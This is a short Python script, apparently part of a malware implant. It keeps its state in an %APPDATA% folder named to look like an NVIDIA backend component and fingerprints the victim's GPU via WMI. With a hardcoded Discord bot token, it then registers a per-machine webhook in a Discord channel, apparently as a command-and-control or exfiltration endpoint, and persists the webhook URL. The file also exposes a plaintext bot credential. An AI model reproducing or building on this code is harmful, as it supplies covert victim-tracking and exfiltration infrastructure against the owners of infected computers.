import os, json, uuid, pathlib, requests
app = pathlib.Path(os.getenv("APPDATA")) / "NvBackend"
hook_file = app / "hook.txt"
pcid = (app / "pcid.txt").read_text().strip()

import wmi
gpu = wmi.WMI().Win32_VideoController()[0].Name
name = f"{gpu}(pc){pcid}"

if not hook_file.exists() or requests.get(hook_file.read_text().strip()).status_code != 200:
    TOKEN   = "MTI2NzU3NzAwMTA2NjEwMjg0Ng.G0uZwa.3a1GlafT1hXccMhDPblG32oGw3GBLZOev-6ZKA"
    CHANNEL = "1404194403261878322"
    url = f"https://discord.com/api/v10/channels/{CHANNEL}/webhooks"
    body = {"name": name}
    headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
    hook = requests.post(url, json=body, headers=headers).json()
    hook_file.write_text(hook["url"])
